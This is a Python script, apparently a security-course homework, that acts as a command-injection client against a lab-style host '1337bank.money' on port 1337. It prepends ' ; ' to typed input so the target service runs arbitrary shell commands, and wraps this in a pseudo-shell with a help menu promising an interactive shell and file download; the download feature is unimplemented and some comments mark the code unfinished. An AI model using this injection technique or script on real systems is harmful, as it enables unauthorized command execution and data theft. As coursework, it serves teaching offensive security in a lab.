"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
#!/usr/bin/env python3

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):

    print("inshell>", end=" ")
    curr_cmd = ""
    if "shell" in cmd:
        curr_cmd = input()

        # uncomment when can get ls working
        # curr_cmd = curr_cmd.lower()
        # while "quit" not in command
    # curr_cmd = '8.8.8.8 ; ' + curr_cmd + "\n"
    curr_cmd = ' ; ' + curr_cmd + "\n"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    data = s.recv(1024)
    print(data)

    s.send(curr_cmd.encode())
    data = s.recv(10000000)
    print(data)



if __name__ == '__main__':
    print(">", end=" ")
    command = input()
    
    command = command.lower()
    while "quit" not in command:
        if command == "help":
            print("1. shell - Drop into an interactive shell and allow users to gracefully exit\n2. pull - <remote-path> <local-path> Download files\n3. help - Shows this help menu\n4. quit - Quit the shell")
        else:
            execute_cmd(command)

        print(">", end= " ")
        command = input()
        command = command.lower()
